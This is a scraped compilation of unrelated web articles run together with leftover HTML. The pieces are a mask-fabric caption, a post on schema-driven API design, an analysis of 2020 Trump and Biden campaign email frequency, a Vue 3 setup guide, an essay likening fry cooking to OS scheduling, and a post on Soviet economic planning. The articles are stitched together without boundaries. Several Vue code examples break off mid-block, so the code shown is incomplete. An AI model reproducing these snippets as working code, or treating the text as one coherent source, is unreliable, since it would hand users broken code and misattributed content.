srcset="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_300/polypropylene-mask.png 300w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_460/polypropylene-mask.png 460w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_620/polypropylene-mask.png 620w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png 780w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_1180/polypropylene-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png"></p></div><figcaption>A mask with an inner layer of melt-blown non-woven polypropylene and outer layers of cotton.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Polypropylene fabric, in this case, is a melt-blown, non-woven plastic fabric.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>November 12, 2020</p><p>The industry has embraced statically typed languages, but API design remains twenty years in the past. Schema driven development presents an opportunity to pull API design into the present. </p></div></div><div><div><div><p>Two decades ago, it was widely argued that dynamic programming languages were more productive because you didn't have to spend time dealing with type signatures. The only reason, then, to use a statically typed language, was for better performance. Truth be told, at the time, this argument had some validity, and many organizations chose to move away from the Javas of the world, and towards the Pythons. However, this was largely because of the specific statically-typed languages in wide use, and because of a lack of tooling available at the time to support them. </p><p>‍</p><p>By now, that tooling has become much more widely available. In fact, the industry has learned over time that statically typed languages actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability. Editor features like auto-complete and jump-to-definition make programmers much more productive, and are mostly only possible in statically typed languages. We see TypeScript taking off, even though it has no performance benefit over JavaScript, because it is more productive. In addition, larger code bases become easier to manage when everyone is able to have some typed reason about each others’ code,<strong> </strong>resulting in the ability to add features faster, with fewer bugs. In other words, the benefit of maintaining type signatures now well outweighs the cost.&nbsp;&nbsp;</p><blockquote>The industry has learned over time that statically typed languages &nbsp;actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability</blockquote><h3>‍<strong>The status quo for APIs is still freeform</strong></h3><p>When it comes to network APIs, however, the industry is still twenty years behind. Most developers continue to rely on the path of least resistance: defining RESTful services, relying on JSON as the data format and HTTP as the transport protocol. Some feel that dynamically typed JSON, along with loosely-defined REST standards, are more productive than the alternatives, or that the learning curve associated with other API standards is too steep. However, similar to dynamic languages 20 years ago, the status quo of API development leaves a lot of room for improvement.</p><p>‍</p><p>API development today is overwhelmingly freeform. Fundamentally, that means that every company -- and every team within every company -- that claims their services are RESTful can actually have very different API design standards. For example, naming conventions, pagination and versioning could all be radically different on one team compared to another. Often, a team might overload an object with unnecessary fields and use inconsistent data types. Unfortunately, this causes a number of problems.</p><h3>‍<strong>Freeform APIs can cause major problems</strong></h3><p>It’s straightforward to understand why having APIs structured differently harms service grokability. When APIs are designed differently, it’s not always obvious how the service should be used, preventing teams from quickly and confidently building applications around a new service.&nbsp;</p><p>Organizations do make attempts to standardize the service structure, mostly by way of API style guides. Setting a style guide is a headache in and of itself, either requiring a team to craft one or select a popular one. Teams and individuals can rarely agree on a style guide, so this decision often gets ignored and relitigated regularly in code reviews. Ultimately, even if there was internal consensus on an approach to style, there is no good way to enforce, monitor or lint APIs for adherence.</p><p>An inconsistent approach to service design and maintenance has another unintended effect: breaking changes. In a freeform API environment, you can’t fully understand the downstream impacts of making changes to the contract. This works in the opposite direction too; clients with an updated view of the world talking to servers that remain in need of an update, including during rolling updates, can send requests that servers do not understand. There isn’t a good way to work around this as an organization. You either expect that the service will consistently break users, or you develop some sort of internal process to better manage changes to the contract. Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</p><blockquote>Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</blockquote><h3>‍<strong>The opportunity for schema driven development</strong></h3><p>It’s time for the industry to shift from a freeform approach to a world where all APIs are defined programmatically with schemas. Schema driven development solves many of the challenges summarized above. APIs are much easier to grok and can be relied on from day one. Organizations can set and enforce API standards across multiple teams. Service owners can make the changes they need to their service, with more structure in place to prevent breaking clients.&nbsp;</p><p>‍</p><p>This is already a major improvement, but the full opportunity for schemas to improve developer productivity is much greater. Similar to the way that statically typed languages enabled new potential for tools to improve developer productivity, the major promise of schema driven development is the assets that the schema can generate automatically. This is a topic big enough to explore in another article, but suffice it to say, relying on a schema can automate all of the boilerplate code required to actually interact with services.&nbsp;</p><p>‍</p><p>Today, schema driven API protocols are sometimes viewed as something you use only if performance matters. In the same way that typed languages needed tooling to support their adoption, a tooling ecosystem is needed to support the use of schema driven API protocols.&nbsp;</p><p>‍</p><p>We at Buf feel that the best option available today for schema driven development is Protocol Buffers (a topic we’ll explore in a future article), and we’re hard at work building such tooling to support organizations using Protobuf to define their services. We hope that with this kind of tooling, teams will look to API schemas for all-around productivity gains, and not just performance.</p></div></div></div></div>]]>

							<p><span>The 2020 Trump reelection campaign has been anything but traditional and this has extended to their email practices as well. Political campaign email in the US is notorious for breaking general email best practices. Political email is explicitly exempted from compliance with CAN-SPAM, and so it is often a bit of Wild Wild West in regard to list acquisition and unsubscribe maintenance. Even when viewed through that lens, though, the 2020 Trump campaign is extremely unorthodox.</span><span></span></p>
<p><span>As the election started to come to a crescendo in mid-October, and possibly as a result of the Trump campaign <a href="https://www.forbes.com/sites/zengernews/2020/10/29/biden-raised-three-times-trumps-fundraising-haul-in-the-first-two-weeks-of-october/?sh=1555a3a5202b"><span>falling behind</span></a> the Biden campaign in fundraising in early October, the Trump campaign began ramping up the cadence of contact to individuals, peaking at 26 mails per day.&nbsp; That’s not a typo: the Trump campaign on the eve of the election was mailing their respondents an <strong>average of 26 times per day</strong>. Here you can see how that cadence built over the past few months, looking at traffic from joebiden.com and victory.donaldtrump.com, the primary sending domains for the two campaigns:<br></span></p>
<p><span>&nbsp;<img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_1.png" width="624" height="193" alt="George 1"></span></p>
<p><span>It’s interesting to note in the graph that while the Biden campaign mails have trailed off following election day, that the Trump emails are continuing at a high rate/fast pace as he looks to fund efforts to contest election results around the country. Indeed, while the President’s messages are increasingly getting flagged for content on Twitter and Facebook, he’s continuing to use email as a direct channel to supporters. Unlike Twitter, however, the Trump campaign’s emails are presented without <a href="https://help.twitter.com/en/using-twitter/us-elections"><span>fact-checker review</span></a> and 100% focused on raising money for the campaign - every single campaign we identified post-election has been a fundraising mail. Subject line samples post-election include:</span><strong><span></span></strong></p>
<ul>
<li><span><span> </span></span><span>VOTER FRAUD</span></li>
<li><span><span> </span></span><span>We need to HOLD the line</span></li>
<li><span><span> </span></span><span>STOP THE STEAL</span></li>
<li><span><span> </span></span><span>Can you chip in?</span></li>
<li><span><span> </span></span><span>👀</span></li>
</ul>
<p><span>(the emoji eyes subject being my personal favorite).&nbsp; Every one of these emails contains a fundraising call-to-action for the ‘Official Election Defense Fund’ (the majority of which actually </span><span><a href="https://www.washingtonpost.com/politics/trump-donations-debt/2020/11/10/024e1c80-237b-11eb-a688-5298ad5d580a_story.html"><span>goes to his leadership PAC.</span></a> Biden has not stopped his fund-raising mails post-election either, though not all of his mails are fund-raising emails, some simply thank supporters. In keeping with the characteristic tone of his campaign, Biden has been running subject lines like:</span></p>
<ul>
<li><span>[NAME], we need to re-launch the Biden Fight Fund</span></li>
<li><span><span> </span></span><span>A victory for ‘We the People’</span></li>
<li><span><span> </span></span><span>I am honored and humbled to be your President-elect</span></li>
<li><span><span> </span></span><span>Keep the faith</span></li>
</ul>
<p><span></span><span>Biden’s contact cadence has dropped to 1-2 mails per day to subscribers, while Trump’s cadence has actually increased post-election. My colleague <a href="https://www.edatasource.com/author/john-landsman/"><span>John Landsman</span></a> observed: “<span>In fifteen years of working with email analytics, I've never seen a brand or candidate with anything like an hourly contact frequency per subscriber.”</span></span></p>
<p><span></span><span>Trump has seemingly taken his rapid-fire Twitter strategy now to email. Perhaps he’s doing this to creatively work around the warnings on his Twitter messages given email’s semi-independence from walled gardens. The question is, is this technique effective? Ultimately, we will see how that plays out in the campaign finance numbers, but we can get a leading view by looking at the inboxing and read rates on these emails.</span></p>
<p><span>First off, the inboxing statistics for both campaigns look fine, with the Trump campaign’s emails inboxing very reliably. During the 2016 campaign Trump had a real problem with </span><a href="https://www.yahoo.com/entertainment/donald-trump-email-spam-problem-212632215.html"><span>spam filters</span></a><span>, which resulted in significant blocking issues. In the runup to the 2020 election problem, this seems to have been significantly improved. You can see in the chart below that Trump’s inboxing has been ‘fine’ (especially given its volume) and has performed ahead of Biden’s mails every day in the observed period.</span></p>
<p><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_2.png" width="624" height="197" alt="George 2"></p>
<p><span>But are people reading them? Interestingly, the cadence the Trump campaign has adopted hasn’t seemed to affect this, with the read rate hovering around 10%, contrasted with around 20% for the Biden mails. Both of these results are within a normal range for political parties and candidates as a category this campaign season, with Biden’s performance being close to the top quartile and Trump’s just inside the bottom quartile for read rates.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_3.png" alt="George 3"></span></p>
<p><span>With the campaign’s basically identical call-to-action (“donate now!”) across a large number of touchpoints per day, the read rate on individual emails matters less than the gross number of mails a given recipient opens daily. Meaning that since the outcome that all of these 26-daily mails is the same, it’s a mistake to focus on them as individual campaigns and look at their individual read rates. Instead it’s better to look at the entire barrage as a campaign and judge the success based on whether or not any shot in it ‘hits’.</span><br><span></span></p>
<p><span>Prior to October, the two different approaches of the campaigns resulted in basically the same number of emails read by an end-user on a given day. But as the Trump campaign’s cadence rose, these numbers diverged significantly. Based on open data, the average Biden campaign subscriber is now actually reading an email every other day; the average Trump campaign subscriber continues to read multiple emails per day.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_4.png" alt="George 4"></span></p>
<p><span>Trump is also mailing a larger portion of his overall list on any given day, though those lists are slightly shrinking as the daily cadence has gone up.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_5.png" alt="George 5"></span></p>
<p><span>It would be interesting to see what the effect of this high cadence has been on unsubscribes, but it’s important to remember that in the US political mails are not bound by CAN-SPAM and political entities can mail whomever they want how often they want, without legal concerns around maintaining subscription information and handling unsubscribes. A notable difference between the Biden and Trump campaigns is that Biden, in accordance with emailing best practices, includes links to manage your subscription. In contrast, the Trump emails provide no mechanism for recipients to unsubscribe. This is perfectly legal under CAN-SPAM since these are political emails, but it’s a poor practice and I certainly wouldn’t recommend anyone try it at home.</span></p>
<p><span>We can see this difference if we look at inferred unsubscribe rates between the two campaigns.&nbsp; We can’t measure the actual unsubscribe data, but what we can look at is how many recipients stop getting emailed after a given send.&nbsp;</span></p>
<p><span>When we look at that, we see a very low unsubscribe rate for the Trump campaign emails, especially compared to the Biden emails, but this is almost certainly highly affected by the lack of an unsubscribe method in the Trump mails.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_6.png" alt="George 6"></span></p>
<p><span>Trump’s email strategy has been both effective and unorthodox, but it’s likely to cause subscriber burnout in the long run as well as blocking issues if it continues. It also seems likely to be a strategy that will not work beyond his most devoted base - how many people would opt to receive emails at this cadence and for how long?</span></p>
<p><span>Trump’s strategy of increasing frequency so far has worked when it comes to total emails read, but like with all marketing mail, it’s really the downstream conversion (in this case donations) that will measure the ultimate success and time will tell how that has worked. If you are a contrarian, you might be speculating that this increased cadence isn’t a sign of email abuse, but that instead Trump really knows his audience’s appetite for hearing from him and will eat up this strategy. Donations to the legal fund will tell us in the end.</span></p>
<p><span>Either way, Trump and Biden both continue to do major fundraising pushes post-election as they look to fund the expensive work of contesting (and defending) the 2020 election. If you happen to subscribe to either of the campaigns’ emails, I think you will continue to have a full inbox for some time.</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-area"><p><a href="https://github.com/vuejs/vue-next/releases/tag/v3.0.0" target="_blank" rel="noopener">Vue 3.0</a> was (finally!) released a little while ago. It is <em>mostly</em> compatible with the old Vue 2 way of doing things... but lots have changed and there are many new ways of doing things. </p>
<p><strong>This is a guide to setting things up in Vue 3 using the Vue 3 composition API, and instructions for adding packages such as Vuex, Vue Router, Vue Test Utils and setting up Typescript support with Vue 3</strong>. It is intended for readers who are already familiar with Vue 2 but are looking for a tutorial/guide to move their codebase to use Vue 3.</p>
<p>I've created a <a href="https://webdevetc-vue3-example-starter.netlify.app/" target="_blank" rel="noopener">sample app</a>, along with <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">the Vue 3 app source code on Github</a>. </p>
<p>The app is quite basic and is meant just for demonstration purposes. I find tutorials and guides much easier to see when they have a bigger application to refer to, rather than just short snippets.</p>
<h2 id="a-quick-guide-to-vue-3s-composition-api">A quick guide to Vue 3's composition API</h2>
<p>There are tons of guides on Vue 3's composition API. I am really excited to start using it in some projects (although I still have some reservations about how useful it will be - but I felt the same about React hooks, and the have really picked up in popularity)</p>
<p>In Vue 2 (and also in Vue 3 as you can still use the <strong>options API</strong>) you would probably be used to seeing things like this:</p>
<pre><code><span> </span><span>// ...</span>
<span> </span><span>export</span><span> </span><span>default</span><span> </span><span>{</span>
<span> </span><span>data</span><span>()</span><span> </span><span>{</span>
<span>   </span><span>return</span><span> </span><span>{</span>
<span>     postTitle</span><span>:</span><span> </span><span>'</span><span>a default title</span><span>'</span><span>,</span><span>    </span>
<span>   </span><span>}</span>
<span> </span><span>},</span>
<span> methods</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>updateTitle</span><span>(</span><span>newValue</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>this</span><span>.</span><span>postTitle</span><span> </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>},</span>
<span> computed</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>numWordsInTitle</span><span>()</span><span> </span><span>{</span>
<span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>postTitle</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>)</span><span>.</span><span>length</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>}</span>
<span>}</span></code></pre>
<p>And then in your <code>&lt;template&gt;</code> you could reference those data/methods/computed properties:</p>
<pre><code><span>&lt;</span><span>template</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>h1</span><span>&gt;{{</span><span> </span><span>postTitle</span><span> </span><span>}}&lt;/</span><span>h1</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>p</span><span>&gt;</span><span>Post has </span><span>{{</span><span> </span><span>numWordsInTitle</span><span> </span><span>}}</span><span> words</span><span>&lt;/</span><span>p</span><span>&gt;</span>
<span> </span><span>&lt;</span><span>button</span><span> </span><span>@click</span><span>=</span><span>"</span><span>updateTitle</span><span>(</span><span>'</span><span>something new</span><span>'</span><span>)</span><span>"</span><span>&gt;</span><span>Update to 'something new'</span><span>&lt;/</span><span>button</span><span>&gt;</span>
<span>&lt;/</span><span>template</span><span>&gt;</span></code></pre>
<p><strong>To convert from that 'old' Vue 2 options API to using the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">Vue 3 composition API</a></strong>, you would instead do the following:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>defineComponent</span><span>,</span><span> </span><span>ref</span><span>,</span><span> </span><span>computed</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<p>The <code>&lt;template&gt;...&lt;/template&gt;</code> part would be the same as the above. Anything returned from <code>setup()</code>'s object will be available to use in the <code>&lt;template&gt;</code>.</p>
<p>For a very small example of a Vue 3 component which uses <code>setup()</code> and then uses the data returned from that function within <code>&lt;template&gt;</code>, check out <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/src/components/layout/components/Sidebar.vue" target="_blank" rel="noopener">this example component</a></p>
<p>There is much more that can be said about the composition API. But this is just a brief introduction. I have a more <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">in-depth overview of Vue 3's composition API here</a>.</p>
<h3 id="set-up-vue-3-with-sassscss">Set up Vue 3 with Sass/SCSS</h3>
<p>It is very easy to set up Sass with Vue 3, which I always prefer as it makes writing CSS a little nicer.</p>
<p>Basic setup of Sass in Vue 3 is quite easy: <code>yarn add -D sass-loader sass</code>. I have written more about <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-global-scss-sass-variables/">setting up Sass in Vue 3 here (including global config)</a></p>
<h3 id="setting-up-vuex-in-vue-3">Setting up Vuex in Vue 3</h3>
<p>There are some arguments that Vuex will not be needed as often, thanks to the <a href="https://webdevetc.com/programming-tricks/vue3/vue3-guides/vue-3-composition-api/">composition API in Vue 3</a>. But I think for large applications it will still be a staple part of using Vue.</p>
<p><code>yarn add vuex</code></p>
<p>(I'm using 4.0.0, which works with Vue 3)</p>
<p>In your <code>main.js</code> or <code>main.ts</code> file you will need to set it up like this:</p>
<pre><code><span>import</span><span> </span><span>{</span><span> </span><span>createApp</span><span> </span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span>
<span>import</span><span> </span><span>{</span><span>createStore</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vuex</span><span>'</span>
<span>import</span><span> </span><span>App</span><span> </span><span>from</span><span> </span><span>'</span><span>./App.vue</span><span>'</span><span>;</span><span> </span><span>// Your main component</span>

<span>const</span><span> </span><span>store</span><span> </span><span>=</span><span> </span><span>createStore</span><span>(</span><span>{</span>

<p>Once you have your Vue 3 Vuex config set up, you just need to access the store in your Vue 3 components.</p>
<p>One way to do this is via the composition API:</p>
<pre><code><span>import</span><span> </span><span>{</span><span>computed</span><span>,</span><span> </span><span>defineComponent</span><span>}</span><span> </span><span>from</span><span> </span><span>'</span><span>vue</span><span>'</span><span>;</span>

<span>    </span><span>return</span><span> </span><span>{</span>
<span>      </span><span>post</span><span>,</span>
<span>    </span><span>}</span>
<span>  </span><span>},</span>
<span>}</span><span>)</span><span>;</span></code></pre>

<h3 id="using-typescript-in-vue-3">Using Typescript in Vue 3</h3>
<p>Vue 3 fully supports Typescript. The fact that it works so well now with Typescript is one of my favourite new things about Vue 3. It was always a bit hard to get everything typed correctly in Vue 2. </p>
<p>It is still possible to use plain Javascript with Vue 3, if you are not keen on Typescript.</p>
<p><strong>This section of my Vue 3 guide explains how to install and set up Typescript with a Vue 3 installation.</strong></p>
<p>For the configuration to set up Typescript in Vue 3 I would recommend looking <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter/blob/main/tsconfig.json" target="_blank" rel="noopener">at this tsconfig.json</a>. </p>
<p>There are some packages which will need to be installed.</p>
<p>If you originally set up Vue via the Vue CLI and are adding Typescript manually then run <code>yarn add -D @vue/cli-plugin-typescript</code>.</p>
<p>For custom setups you will need <code>yarn add -D typescript vue-loader</code> (check out package.json in that repo). </p>
<p>You will also need to update or create your <code>webpack.config.js</code> config file. The important lines are marked below with <code>&lt;&lt;</code>.</p>
<pre><code><span>const</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>'</span><span>path</span><span>'</span><span>)</span>

<span>      </span><span>}</span>
<span>    ]</span>
<span>  </span><span>}</span>
<span>}</span></code></pre>
<p>Once set up, all you have to do is change <code>&lt;script&gt;</code> to <code>&lt;script lang="ts"&gt;</code> in your <code>.vue</code> files.</p>

<p>Most people thought I was crazy for doing this, but I spent the last few months of my gap year working as a short order cook at a family-owned fast-food restaurant. (More on this <a href="https://offlinemark.com/2020/11/12/gap-year-restaurant/">here</a>.) I’m a programmer by trade, so I enjoyed thinking about the restaurant’s systems from a programmer’s point of view. Here’s some thoughts about two such systems.</p>



<h2>Double, triple, and even quadruple fetching</h2>



<p>Human systems, at first glance, can appear broken, but due to subtle human factors, they might actually work just fine.</p>



<p>My best example is the system for taking and fulfilling orders. We never wrote anything down, and would re-ask orders multiples times, including when ringing customers up. (In computer security, this is known as a <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/">double fetch</a>.) Not great service and can theoretically let customers lie and pay less. </p>



<p>In practice most customers didn’t mind <em>too</em> much, liars are rare, and we can loosely detect when something seems off with an order.</p>



<p>Writing orders down and asking strictly once seems optimal but has subtle flaws. For one thing, there’s not enough space behind the counter for everyone to walk to the written order, so it requires more internal communication. This will fail during a rush when you’re blocked on order details and coworkers are too busy for questions. <strong>Customers are always idle; coworkers aren’t</strong>.</p>



<p>It can increase confusion if order slips aren’t thrown out when orders are finished and is also logistically (and literally) messy if you have greasy gloves and want to avoid touching a pen, then food. Lastly, many of my coworkers were older and very used to the existing system. <strong>A major transition to a new system would have generated more confusion than it’s worth</strong>.</p>



<h2>Scheduling algorithms for the fry cook</h2>



<p>While I covered a range of duties including the cash register, milkshake machine, and grill, I spent the most time on the deep fryer. I’m delighted to present this overanalysis of life as a fry cook, from a programmer’s point of view.</p>



<p>This is what deep fryers look like (<a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.nachi.org%2Fdeep-fryer-inspection.htm&amp;psig=AOvVaw1D90dsceyn1wmU-KOGAEuy&amp;ust=1605391502547000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCNCq-sPDgO0CFQAAAAAdAAAAABAE">source</a>):</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;ssl=1" alt="Deep Fryer" width="360" height="352" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>This picture has 2 fryers, each with 2 baskets that can be submerged to sit in the vats of hot oil below. At work, only 1 fryer would be active on any given day which effectively allows 2 items to be fried at the same time.</p>



<p><strong>Fry cooks have a lot in common with operating systems in that they are both responsible for scheduling</strong>. Operating systems schedule threads to run on a limited number of cores; fry cooks schedule food to be fried in a limited number of fryers. Different food items have different priorities, and different lengths of time to cook.</p>



<p>French fries, curly fries, and onion rings (collectively, “fries”) are the main menu items from the deep fryer. Each fry order could be large or small (except for rings which were only large) and eat-in or to-go. The job of the fry cook is to:</p>



<ul><li>Accept fry orders from the greeter.</li><li>Allocate portions of fries from the big bags of raw fries</li><li>Cook them in the fryers</li><li>Put them into the appropriate eat-in/to-go container</li><li>Serve them onto the customer’s tray on the counter, or their to-go bag</li></ul>



<p>The goal is to do this with maximum speed and accuracy and without dropping orders. You’ll ideally minimize the number of times you ask customers and coworkers for order details. In addition, there are a few sources of complexity to handle:</p>



<ul><li><strong>Incomplete information</strong>: Depending on the greeter, they may forget to specify if it’s eat-in or to-go. You can always ask the customer, but the grill chef will likely ask the same question in a little bit. You might be able to save a customer ask if you can eavesdrop on that interaction.</li><li><strong>Timing requirements</strong>: You need to finish orders by the time the grill chef finishes the burgers/hot dogs, but you shouldn’t finish too early. If you put the fries on the counter way before the burgers are ready, they’ll get cold. This matters less for to-go orders, which you can serve into the bag immediately.</li><li><strong>Scale</strong>: During a rush, you might receive many orders per minute, while only being able to process 1-2 per minute. Once the greeter relays the order, they forget it, so it’s up to you to remember. And remember: no writing things down.</li><li><span><strong>Waste avoidance</strong>: </span>Sometimes you or another cook will make too many fries. To avoid wasting them, you can use the excess towards a future order by refreshing them with a splash later and adding them to a fresh batch.</li><li><strong>Changing orders</strong>: Customers sometimes change their order after you’ve started cooking (e.g. regular fry to curly fry). Now you have to figure out what to do with the partially cooked portion currently in the fryer.</li><li><strong>Miscellaneous items</strong>: In addition to fries, there other items that need to be scheduled for time in the fryer, including chicken patties, bacon, clam strips, and fish fillets. </li></ul>



<p>A few techniques to manage all this:</p>



<ul><li><strong>Batching orders together</strong>. If a large and small fry order are in the queue, you can cook them in the same basket at the same time.<ul><li>Some customers request their fries “well done”, meaning cooked extra long. This makes batching more complicated.</li></ul></li><li><strong>“Wait n Splash”</strong>: If a fry order is done cooking far before the rest of the grill items and you don’t have pressing items that need fryer time, you can raise the basket from the oil, but leave the food in it. When the grill items finish, you can quickly splash the food back in the oil to refresh it, then serve it. This will prevent it from getting cold on the counter.</li><li><strong>Inactive fryer baskets</strong>: It can be handy to have extra storage space for cooked food. If you have a “wait n splash” order waiting, but you have more orders to fry, you can use the 2 spare baskets from the inactive fryer to store the waiting order and free up the fryer slot. This is also useful when customers change their order and you need to quickly stash the half cooked portion somewhere and start the adjusted order.</li><li><strong>“The tong dip”</strong>: If both fryers are in use and the grill chef hands you bacon to be urgently cooked, you can hold the bacon in tongs and dip it into one of the submerged baskets. This lets you effectively cook more than 2 things at the same time.</li></ul>



<p>Here’s the system I ended up using. When a new order came in, I’d stop whatever I was doing and grab the appropriate container and place it in the corresponding fry bucket. This captures all 3 pieces of information about the order (fry type, size, to-go?) letting me forget it. If I strictly follow this, I can just process the containers in the buckets like a queue. However, I still need to keep a sense of order memorized because the system doesn’t capture global ordering – if I have containers in the fry, curly fry, and onion ring buckets, I can’t tell which order came in first.</p>



<p>I don’t have a solution for this. On a super busy day, this system falls apart and I drop orders. Extreme load like that has only happened a few times and in that case, I just make large batches, forget about syncing up with the grill items, and hope I don’t have too much excess at the end. Generally, the system worked nicely.</p>



<h2>Conclusion</h2>



<p>It’s fun to think about human systems, like those in a restaurant, from a programmer’s point of view. A fry cook’s job closely resembles that of an operating system scheduler, complete with optimization points and edge cases. One can try to optimize human systems as if they were computer systems, but it’s critical to understand the subtle human aspects of the system when evaluating improvements.</p>

<p>As a data scientist, a big part of my job involves picking metrics to optimize and thinking about how to do things as efficiently as possible. With these types of questions on my mind, I recently discovered a totally fascinating book about about economic problems in the USSR and the team of data-driven economists and computer scientists who wanted to solve them. The book is called <a href="http://www.amazon.com/Red-Plenty-Francis-Spufford/dp/1555976042"><em>Red Plenty</em></a>. It’s actually written as a novel, weirdly, but it nevertheless presents an accurate economic history of the USSR. It draws heavily on an earlier book from 1973 called <a href="http://www.amazon.com/Planning-Problems-USSR-Contribution-Mathematical/dp/0521202493"><em>Planning Problems in the USSR</em></a>, which I also picked up. As I read these books, I couldn’t help but notice some parallels with planning in any modern organization. In what will be familiar to any data scientist today, the second book even includes a quote from a researcher who complained that 90% of his time was spent cleaning the data, and only 10% of his time was spent doing actual modeling!</p>

<p>Beyond all the interesting parallels to modern data science and operations research, these books helped me understand a lot of interesting things I previously knew very little about, such as linear programming, price equilibria, and Soviet history. This blog post is about I learned.</p>

<h4>Balance sheets and manual calculation: Kind of a trainwreck</h4>

<p>The main task in the centrally planned Soviet economy was to allocate resources so that a desired assortment of goods and services was produced. Every year, certain target outputs for each good were established. Armed with estimates of the available input resources, central administrators used balance sheets to set plans for every factory, specifying exactly how much input commodities each factory would receive, and how much output it should produce. Up through the 1960s, this was always done by manual calculation. Since there were hundreds of thousands of commodities, and since the supply chains had many dependency steps, it was impossible to compute the full balance sheets for the economy. The administrators therefore decided to make some simplifying assumptions. As a result of these these simplifying assumptions, resource allocation became a bit of a trainwreck. Below are a few of the simplifications and their consequences.</p>

<ul>
  <li><strong>Dimensionality reduction by removing variables.</strong> Because there were too many commodities to track, administrators often limited their analysis to the 10,000 most important commodities in the economy. But when the production of those commodities were planned, there was often a hidden shortage of commodities whose output was not planned centrally but which were used as inputs to one of the 10,000 planned products. Factories that depended on those commodities often sat idle for months as they waited for the shortages to end.</li>
  <li><strong>Dimensionality reduction by aggregation.</strong> Apparently, steel tubes can come in thousands of different types. They can come in different lengths, different shapes, and different compositions. To reduce the dimensionality of the problem, administrators would often track the total tonnage of a few broad classes of steel tubes in the models, rather than using a more detailed classification scheme. While their models successfully balanced the tonnage of tubes for the broad categories (the output in tons of tube-producing factories matched the input requirements in tons of tube-consuming factories), there were constant surpluses of some specific types of tubes, and shortages of other specific types of tubes.&nbsp;In particular, since tonnage was used as a metric, tube-producing factories were overly incentivized to make easy-to-produce thick tubes. As a result, thin tubes were always in short supply.</li>
  <li><strong>Propagating adjustments only a few degrees back.</strong> Let’s say that during balance calculations, the administrators realized they needed to bump up the target output of one commodity. If they did that, it was also necessary to bump up the output targets of commodities that were input into the target commodity. But if they did <em>that</em>, they also needed to bump up the output targets of commodities that fed into those commodities, and so on! This involved a crazy amount of extra hand calculations every time they needed make an adjustment. To simplify things, the administrators typically made adjustments to the first-order suppliers, without making the necessary adjustments to the suppliers of the suppliers. This of course led to critical shortages of input commodities, which again led to idle factories.</li>
</ul>

  <p><strong>Figure 1.</strong> Some example inputs and outputs in the Soviet economy in 1951, described in units of weight. This summary shows an extreme dimensionality reduction, more extreme than was ever used in planning. In this diagram, most commodities are excluded and each displayed commodity collapses across multiple different product types. Multiple steps in the supply chain are collapsed into a single step. (Source: <a href="http://www.foia.cia.gov/sites/default/files/document_conversions/89801/DOC_0000380738.pdf">CIA</a>)</p>
</div>

